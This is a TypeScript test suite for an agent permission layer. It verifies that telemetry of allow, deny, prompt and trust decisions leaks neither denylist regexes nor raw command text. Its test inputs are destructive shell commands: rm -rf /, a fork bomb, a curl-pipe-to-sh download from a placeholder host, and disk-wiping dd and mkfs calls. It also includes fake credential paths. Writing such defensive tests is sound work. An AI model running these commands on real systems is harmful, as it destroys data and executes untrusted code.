/**
 * HELLGATE — `quanta.permission.*` OTel vocabulary activation invariants.
 *
 * The vocabulary at `src/observability/vocabulary.ts` declared 12
 * `quanta.permission.*` attribute keys but every decision site in
 * `src/permission/` returned a verdict without emitting any of them. This
 * battery proves the activation lands at the outcome sites AND that the
 * security invariants are upheld:
 *
 *   1. **Surface coverage** — all 4 canonical outcome labels
 *      (`"allow" | "deny" | "prompt" | "trust"`) reach the recorder when the
 *      corresponding decision is rendered.
 *
 *   2. **No HARD_DENY regex leakage** — the matched rule's source pattern
 *      MUST NOT appear in any emitted attribute value. A dashboard or log
 *      record built from these attrs cannot be used to back-channel the
 *      denylist's exact regex into operator-visible surfaces.
 *
 *   3. **No raw command text in attributes** — `permission.tool_arg.*`-shaped
 *      keys are forbidden (the vocabulary deliberately excludes them) AND no
 *      emitted value may contain the literal command string the action
 *      represented. Categorical labels and the 32-hex `actionSignature` are
 *      the only fields permitted to carry per-action data.
 *
 *   4. **Default-OFF** — without a registered recorder, the slice is byte-
 *      identical to its pre-emit form (zero allocation, zero behavioral
 *      change). A throw from the recorder is swallowed and never propagates
 *      back to a `PermissionDecision`.
 *
 * Source under test:
 *   src/permission/recorder.ts       — emit seam (setter + helpers).
 *   src/permission/policy.ts         — evaluate / evaluateAuto / evaluateStack.
 *   src/permission/reviewer.ts       — reviewAction (sticky + fresh).
 *   src/permission/post-denial.ts    — record* funnel.
 */
import { afterEach, describe, expect, test } from "bun:test"
import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
  __resetPermissionRecorder,
  AutoModeClassifier,
  buildDecision,
  computeActionSignature,
  createPermissionStore,
  type DenialMemory,
  evaluate,
  evaluateAuto,
  evaluateStack,
  type PermissionDecision,
  type PermissionDecisionRecord,
  type PermissionRecorder,
  type PostDenialEventRecord,
  recordDenial,
  recordRiskSeen,
  recordUserOverride,
  reviewAction,
  setPermissionRecorder,
} from "@/permission"
import { HARD_DENY_RULES } from "@/permission/policy"

// ---------------------------------------------------------------------------
// Mock recorder — captures every emit for assertions
// ---------------------------------------------------------------------------

const mkRecorder = (): {
  recorder: PermissionRecorder
  decisions: PermissionDecisionRecord[]
  events: PostDenialEventRecord[]
} => {
  const decisions: PermissionDecisionRecord[] = []
  const events: PostDenialEventRecord[] = []
  const recorder: PermissionRecorder = {
    onDecision: (record) => {
      decisions.push(record)
    },
    onPostDenialEvent: (record) => {
      events.push(record)
    },
  }
  return { recorder, decisions, events }
}

/** Flatten a record to its string-valued fields for substring scanning.
 *  Every per-emit record carries primitive values; we keep only strings
 *  here because the leak channel of concern (raw command text / regex
 *  source) is always a string. */
const stringValues = (r: PermissionDecisionRecord | PostDenialEventRecord): string[] => {
  const out: string[] = []
  for (const v of Object.values(r as unknown as Record<string, unknown>)) {
    if (typeof v === "string") out.push(v)
  }
  return out
}

// ---------------------------------------------------------------------------
// Lifecycle — clear the recorder between cases so leak detection is clean
// ---------------------------------------------------------------------------

afterEach(() => {
  __resetPermissionRecorder()
})

// ---------------------------------------------------------------------------
// 1. Surface coverage — all 4 outcome labels reach the recorder
// ---------------------------------------------------------------------------

describe("hellgate — surface coverage (all 4 outcome labels)", () => {
  test("'allow' fires on read-only action", () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    evaluate({ tool: "read", input: {}, isReadOnly: true }, { mode: "default" })
    expect(decisions.some((d) => d.outcome === "allow")).toBe(true)
  })

  test("'deny' fires on HARD_DENY hit even under bypass mode", () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    evaluate(
      {
        tool: "bash",
        input: { command: "rm -rf /" },
        isReadOnly: false,
        shellCommand: "rm -rf /",
      },
      { mode: "bypass" },
    )
    expect(decisions.some((d) => d.outcome === "deny")).toBe(true)
  })

  test("'prompt' fires on mutating action under default mode", () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    evaluate({ tool: "write", input: { path: "a.txt" }, isReadOnly: false }, { mode: "default" })
    expect(decisions.some((d) => d.outcome === "prompt")).toBe(true)
  })

  test("'trust' fires on post-denial-override allow path through evaluateStack", async () => {
    const tmp = await mkdtemp(join(tmpdir(), "quanta-otel-trust-"))
    const store = createPermissionStore({
      filePath: join(tmp, "state.json"),
      debounceMs: 0,
    })
    await store.load()
    const action = { threadId: "t1", tool: "edit", workdir: "/repo", args: { path: "a.txt" } }
    // Build the full denied → risk-seen → override sequence so
    // hasPostDenialOverride returns true.
    recordDenial(action, "policy:test", { store, clock: { now: () => 100 } })
    recordRiskSeen(action, { store, clock: { now: () => 200 } })
    recordUserOverride(action, { store, clock: { now: () => 300 } })

    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    const sig = computeActionSignature({
      tool: action.tool,
      workdir: action.workdir,
      args: action.args,
    })
    evaluateStack(
      { tool: action.tool, input: action.args, isReadOnly: false },
      { mode: "default" },
      {
        threadId: action.threadId,
        hostId: "localhost",
        actionSignature: sig,
        workdir: action.workdir,
      },
      { store },
    )
    expect(decisions.some((d) => d.outcome === "trust")).toBe(true)
    await store.flush()
    await rm(tmp, { recursive: true, force: true })
  })

  test("collectively, a 4-case battery hits ALL labels exactly once each (no drops)", async () => {
    const tmp = await mkdtemp(join(tmpdir(), "quanta-otel-all4-"))
    const store = createPermissionStore({
      filePath: join(tmp, "state.json"),
      debounceMs: 0,
    })
    await store.load()
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    // allow
    evaluate({ tool: "read", input: {}, isReadOnly: true }, { mode: "default" })
    // deny
    evaluate(
      {
        tool: "bash",
        input: { command: "rm -rf /" },
        isReadOnly: false,
        shellCommand: "rm -rf /",
      },
      { mode: "bypass" },
    )
    // prompt
    evaluate({ tool: "write", input: { path: "a.txt" }, isReadOnly: false }, { mode: "default" })
    // trust (post-denial-override)
    const action = { threadId: "t1", tool: "edit", workdir: "/repo", args: { path: "a.txt" } }
    recordDenial(action, "policy:test", { store, clock: { now: () => 100 } })
    recordRiskSeen(action, { store, clock: { now: () => 200 } })
    recordUserOverride(action, { store, clock: { now: () => 300 } })
    const sig = computeActionSignature({
      tool: action.tool,
      workdir: action.workdir,
      args: action.args,
    })
    evaluateStack(
      { tool: action.tool, input: action.args, isReadOnly: false },
      { mode: "default" },
      {
        threadId: action.threadId,
        hostId: "localhost",
        actionSignature: sig,
        workdir: action.workdir,
      },
      { store },
    )

    const labels = new Set<string>(decisions.map((d) => d.outcome as string))
    expect(labels.has("allow")).toBe(true)
    expect(labels.has("deny")).toBe(true)
    expect(labels.has("prompt")).toBe(true)
    expect(labels.has("trust")).toBe(true)
    await store.flush()
    await rm(tmp, { recursive: true, force: true })
  })
})

// ---------------------------------------------------------------------------
// 2. No HARD_DENY regex leakage — adversarial scan of every captured attr
// ---------------------------------------------------------------------------

describe("hellgate — no HARD_DENY regex source ever appears in any attr", () => {
  /** Collect a sample of every HARD_DENY rule's regex `.source` for the
   *  cross-attribute scan. We scan ALL 30+ rules so future rule additions
   *  are also caught — there is no "first N rules" cutoff. */
  const hardDenyRegexSources: readonly string[] = HARD_DENY_RULES.map((r) => r.pattern.source)

  /** Distinctive tokens from the regex sources that are unlikely to appear
   *  in a legitimate categorical label — used as the substring probe so a
   *  false positive on "deny" (the literal outcome label) doesn't trigger
   *  the leak alarm. Each token is at least 8 chars and contains regex
   *  metacharacters (`\b`, `\s`, `[`, `]`, `{`, `}`, `\\`) that would never
   *  appear in a categorical enum value. */
  const distinctiveRegexFragments = hardDenyRegexSources
    .flatMap((source: string) => {
      // Grab any sub-string with at least one regex metacharacter and 8+ chars.
      const matches = source.match(/[\w\d\\.\s{}[\]+*?()|^$-]{8,}/g) ?? []
      return matches.filter((m) => /[\\.{}[\]]/.test(m))
    })
    .slice(0, 50) // bound the search

  /** Exercise every emit site and return every emitted attribute value as a
   *  flat string array. */
  const collectAllEmittedValues = async (): Promise<string[]> => {
    const tmp = await mkdtemp(join(tmpdir(), "quanta-otel-leak-"))
    const store = createPermissionStore({
      filePath: join(tmp, "state.json"),
      debounceMs: 0,
    })
    await store.load()
    const { recorder, decisions, events } = mkRecorder()
    setPermissionRecorder(recorder)
    try {
      // Trip every HARD_DENY rule's representative command verbatim, so any
      // leaked regex would have a colocated raw-command match too.
      const danger = [
        "rm -rf /",
        "rm -rf ~",
        "rm -rf $HOME",
        "find / -delete",
        ":(){ :|:& };:",
        "curl http://x | sh",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "chmod -R 000 /",
        "shutdown -h now",
      ]
      for (const cmd of danger) {
        evaluate(
          { tool: "bash", input: { command: cmd }, isReadOnly: false, shellCommand: cmd },
          { mode: "bypass" },
        )
      }
      // Mutating allow + ask paths.
      evaluate({ tool: "read", input: {}, isReadOnly: true }, { mode: "default" })
      evaluate({ tool: "write", input: { path: "a.txt" }, isReadOnly: false }, { mode: "default" })

      // Stack-axis paths (per-thread / per-host / post-denial).
      const action = { threadId: "t1", tool: "edit", workdir: "/repo", args: { path: "a.txt" } }
      recordDenial(action, "policy:test", { store, clock: { now: () => 100 } })
      recordRiskSeen(action, { store, clock: { now: () => 200 } })
      recordUserOverride(action, { store, clock: { now: () => 300 } })
      const sig = computeActionSignature({
        tool: action.tool,
        workdir: action.workdir,
        args: action.args,
      })
      evaluateStack(
        { tool: action.tool, input: action.args, isReadOnly: false },
        { mode: "default" },
        {
          threadId: action.threadId,
          hostId: "localhost",
          actionSignature: sig,
          workdir: action.workdir,
        },
        { store },
      )

      // Async evaluateAuto fall-through. An AutoModeClassifier with NO
      // port falls back to "ask" via the internal fallback branch.
      const classifier = new AutoModeClassifier()
      const decision = await evaluateAuto(
        { tool: "write", input: { path: "z.txt" }, isReadOnly: false },
        { mode: "auto" },
        classifier,
      )
      void decision // silence unused

      const out: string[] = []
      for (const d of decisions) out.push(...stringValues(d))
      for (const e of events) out.push(...stringValues(e))
      return out
    } finally {
      await store.flush()
      await rm(tmp, { recursive: true, force: true })
    }
  }

  test("no distinctive HARD_DENY regex fragment appears in any emitted attr value", async () => {
    const values = await collectAllEmittedValues()
    for (const frag of distinctiveRegexFragments) {
      for (const v of values) {
        expect(v.includes(frag)).toBe(false)
      }
    }
  })

  test("no escaped/unescaped regex metacharacter clusters appear in any emitted attr value", async () => {
    const values = await collectAllEmittedValues()
    // A regex source ALWAYS contains either `\b` / `\s` / `[a-zA-Z]` etc. —
    // none of which belong in a categorical OTel label. Probe for the three
    // shapes that are unique to regex sources.
    const regexShapes = [/\\b\b/, /\\s\+/, /\[\^/]
    for (const v of values) {
      for (const shape of regexShapes) {
        expect(shape.test(v)).toBe(false)
      }
    }
  })
})

// ---------------------------------------------------------------------------
// 3. No raw command text in attributes
// ---------------------------------------------------------------------------

describe("hellgate — no raw command text in any permission attribute", () => {
  /** The record shape MUST NOT have a field named `tool_arg*` (or any per-
   *  arg shape) — the vocabulary deliberately excludes per-arg keys. */
  const FORBIDDEN_FIELDS = ["toolArg", "tool_arg", "args", "input", "command"] as const
  const assertNoForbiddenKeys = (record: object): void => {
    for (const k of Object.keys(record as Record<string, unknown>)) {
      for (const forbidden of FORBIDDEN_FIELDS) {
        expect(k.startsWith(forbidden)).toBe(false)
      }
    }
  }

  test("no attribute key is shaped like `quanta.permission.tool_arg.*`", () => {
    const { recorder, decisions, events } = mkRecorder()
    setPermissionRecorder(recorder)
    evaluate(
      {
        tool: "bash",
        input: { command: "rm -rf /" },
        isReadOnly: false,
        shellCommand: "rm -rf /",
      },
      { mode: "bypass" },
    )
    evaluate({ tool: "read", input: {}, isReadOnly: true }, { mode: "default" })
    evaluate({ tool: "write", input: { path: "a.txt" }, isReadOnly: false }, { mode: "default" })
    for (const d of decisions) assertNoForbiddenKeys(d)
    for (const e of events) assertNoForbiddenKeys(e)
  })

  test("the raw command string never appears as an attribute value", () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    const sentinelCommand = "rm -rf /home/secrets/api.key"
    evaluate(
      {
        tool: "bash",
        input: { command: sentinelCommand },
        isReadOnly: false,
        shellCommand: sentinelCommand,
      },
      { mode: "bypass" },
    )
    for (const d of decisions) {
      for (const v of stringValues(d)) {
        expect(v.includes(sentinelCommand)).toBe(false)
        expect(v.includes("rm -rf")).toBe(false)
        expect(v.includes("/home/secrets")).toBe(false)
        expect(v.includes("api.key")).toBe(false)
      }
    }
  })

  test("the raw action args never appear as an attribute value (post-denial path)", async () => {
    const tmp = await mkdtemp(join(tmpdir(), "quanta-otel-raw-"))
    const store = createPermissionStore({
      filePath: join(tmp, "state.json"),
      debounceMs: 0,
    })
    await store.load()
    const { recorder, decisions, events } = mkRecorder()
    setPermissionRecorder(recorder)
    const sentinelPath = "/etc/super-secret-credentials.yaml"
    const action = {
      threadId: "t1",
      tool: "edit",
      workdir: "/repo",
      args: { path: sentinelPath, content: "AWS_KEY=AKIA...sentinel..." },
    }
    recordDenial(action, "policy:test", { store, clock: { now: () => 100 } })
    recordRiskSeen(action, { store, clock: { now: () => 200 } })
    recordUserOverride(action, { store, clock: { now: () => 300 } })
    const sig = computeActionSignature({
      tool: action.tool,
      workdir: action.workdir,
      args: action.args,
    })
    evaluateStack(
      { tool: action.tool, input: action.args, isReadOnly: false },
      { mode: "default" },
      {
        threadId: action.threadId,
        hostId: "localhost",
        actionSignature: sig,
        workdir: action.workdir,
      },
      { store },
    )
    for (const d of decisions) {
      for (const v of stringValues(d)) {
        expect(v.includes(sentinelPath)).toBe(false)
        expect(v.includes("AWS_KEY")).toBe(false)
        expect(v.includes("AKIA")).toBe(false)
      }
    }
    for (const e of events) {
      for (const v of stringValues(e)) {
        expect(v.includes(sentinelPath)).toBe(false)
        expect(v.includes("AWS_KEY")).toBe(false)
        expect(v.includes("AKIA")).toBe(false)
      }
    }
    await store.flush()
    await rm(tmp, { recursive: true, force: true })
  })

  test("actionSignature, when emitted, is the canonical 32-hex hash (not raw args)", async () => {
    const tmp = await mkdtemp(join(tmpdir(), "quanta-otel-sig-"))
    const store = createPermissionStore({
      filePath: join(tmp, "state.json"),
      debounceMs: 0,
    })
    await store.load()
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    const sentinelArg = "WHEN-IN-DOUBT-SHOULD-NOT-LEAK"
    const sig = computeActionSignature({
      tool: "edit",
      workdir: "/repo",
      args: { sentinel: sentinelArg },
    })
    evaluateStack(
      { tool: "edit", input: { sentinel: sentinelArg }, isReadOnly: false },
      { mode: "default" },
      { threadId: "t1", hostId: "localhost", actionSignature: sig, workdir: "/repo" },
      { store },
    )
    for (const d of decisions) {
      for (const v of stringValues(d)) {
        // sentinel arg must NEVER appear anywhere
        expect(v.includes(sentinelArg)).toBe(false)
      }
      // actionSignature field, when present, MUST match the canonical
      // 32-hex shape — proves the caller passed the hash, not raw args.
      if (d.actionSignature !== undefined) {
        expect(/^[0-9a-f]{32}$/.test(d.actionSignature)).toBe(true)
      }
    }
    await store.flush()
    await rm(tmp, { recursive: true, force: true })
  })
})

// ---------------------------------------------------------------------------
// 4. Default-OFF + recorder-throw isolation
// ---------------------------------------------------------------------------

describe("hellgate — default-OFF + recorder-throw isolation", () => {
  test("without a registered recorder, decisions return the same shape as before", () => {
    __resetPermissionRecorder()
    const allow: PermissionDecision = evaluate(
      { tool: "read", input: {}, isReadOnly: true },
      { mode: "default" },
    )
    const ask: PermissionDecision = evaluate(
      { tool: "write", input: { path: "a" }, isReadOnly: false },
      { mode: "default" },
    )
    const deny: PermissionDecision = evaluate(
      {
        tool: "bash",
        input: { command: "rm -rf /" },
        isReadOnly: false,
        shellCommand: "rm -rf /",
      },
      { mode: "bypass" },
    )
    expect(allow.kind).toBe("allow")
    expect(ask.kind).toBe("ask")
    expect(deny.kind).toBe("deny")
  })

  test("a throwing recorder does NOT corrupt the verdict", () => {
    const throwing: PermissionRecorder = {
      onDecision: () => {
        throw new Error("emitter exploded")
      },
      onPostDenialEvent: () => {
        throw new Error("emitter exploded")
      },
    }
    setPermissionRecorder(throwing)
    // The verdict must still be the same byte-identical shape regardless of
    // recorder failure — an observability bug cannot allow a deny or deny an
    // allow.
    const allow = evaluate({ tool: "read", input: {}, isReadOnly: true }, { mode: "default" })
    const deny = evaluate(
      {
        tool: "bash",
        input: { command: "rm -rf /" },
        isReadOnly: false,
        shellCommand: "rm -rf /",
      },
      { mode: "bypass" },
    )
    expect(allow.kind).toBe("allow")
    expect(deny.kind).toBe("deny")
  })
})

// ---------------------------------------------------------------------------
// 5. Reviewer-tier path coverage (reviewAction emits as well)
// ---------------------------------------------------------------------------

describe("hellgate — reviewer-tier decisions also reach the recorder", () => {
  test("a fresh user_approved decision maps to the 'trust' counter label", async () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    const fresh = buildDecision({
      reviewer: "user",
      outcome: "user_approved",
      riskLevel: "high",
      rationale: "operator clicked approve",
      decidedAt: 1,
    })
    await reviewAction(
      { tool: "edit", input: {}, isReadOnly: false, actionKey: "k1" },
      {
        sessionId: "s1",
        turnId: "tu1",
        priorDenials: [],
        configReviewer: "user",
        decidedAt: 1,
      },
      {
        userReview: async () => fresh,
        autoReview: async () => fresh,
        guardianReview: async () => fresh,
      },
    )
    expect(decisions.some((d) => d.outcome === "trust")).toBe(true)
  })

  test("a guardian_denied sticky-replay maps to the 'deny' counter label", async () => {
    const { recorder, decisions } = mkRecorder()
    setPermissionRecorder(recorder)
    const sticky: DenialMemory = {
      sessionId: "s1",
      actionKey: "k1",
      reviewer: "guardian_subagent",
      outcome: "guardian_denied",
      deniedAt: 1,
    }
    await reviewAction(
      { tool: "edit", input: {}, isReadOnly: false, actionKey: "k1" },
      {
        sessionId: "s1",
        turnId: "tu1",
        priorDenials: [sticky],
        configReviewer: "auto_review",
        decidedAt: 2,
      },
      {
        userReview: async () => {
          throw new Error("should not invoke")
        },
        autoReview: async () => {
          throw new Error("should not invoke")
        },
        guardianReview: async () => {
          throw new Error("should not invoke")
        },
      },
    )
    expect(decisions.some((d) => d.outcome === "deny")).toBe(true)
  })
})
